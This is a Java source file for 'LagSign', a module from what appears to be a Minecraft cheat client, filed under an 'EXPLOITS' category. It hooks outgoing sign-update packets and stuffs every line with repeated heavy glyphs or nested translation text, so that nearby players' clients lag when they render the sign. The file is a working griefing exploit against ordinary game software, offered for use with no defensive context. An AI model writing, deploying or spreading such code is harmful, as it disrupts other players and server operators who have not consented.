package me.xatzdevelopments.xatz.client.modules;

import java.util.ArrayList;

import org.lwjgl.input.Keyboard;

import me.xatzdevelopments.xatz.client.main.Xatz;
import me.xatzdevelopments.xatz.client.module.state.Category;
import me.xatzdevelopments.xatz.module.Module;
import net.minecraft.network.AbstractPacket;
import net.minecraft.network.play.client.C12PacketUpdateSign;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.ChatComponentTranslation;

public class LagSign extends Module {

	ArrayList<String> staff;

	public LagSign() {
		super("LagSign", Keyboard.KEY_NONE, Category.EXPLOITS,
				"Lets players around you lag when placing a sign!");
	}
	
	


	@Override
	public void onDisable() {

		super.onDisable();
	}

	@Override
	public void onEnable() {

		super.onEnable();
	}

	@Override
	public void onUpdate() {

		super.onUpdate();
	}

	@Override
	public void onPacketRecieved(AbstractPacket packetIn) {
        Xatz.chatMessage("xd");
        if (packetIn instanceof C12PacketUpdateSign) {
        	C12PacketUpdateSign signPkt = (C12PacketUpdateSign)packetIn;
            ChatComponentText send;
            if (currentMode.equals("New")) {
                StringBuilder sb = new StringBuilder();
                int m = 0;
                while (m <= 50) {
                    sb.append("\ufdfd");
                    ++m;
                }
                send = new ChatComponentText(sb.toString());
            } else {
                ChatComponentTranslation trans = new ChatComponentTranslation("options.snooper.desc", new Object[0]);
                send = new ChatComponentText("                           ");
                int i = 0;
                while (i < 8) {
                    send.appendSibling(trans);
                    ++i;
                }
            }
            int i = 0;
            while (i < 4) {
            	signPkt.getLines()[i].appendSibling(send);
                ++i;
            }
        }
        
    }
	@Override
	public String[] getModes() {
		return new String[] { "Old","New"};
	}

	@Override
	public String getAddonText() {
		return currentMode;
	}


}

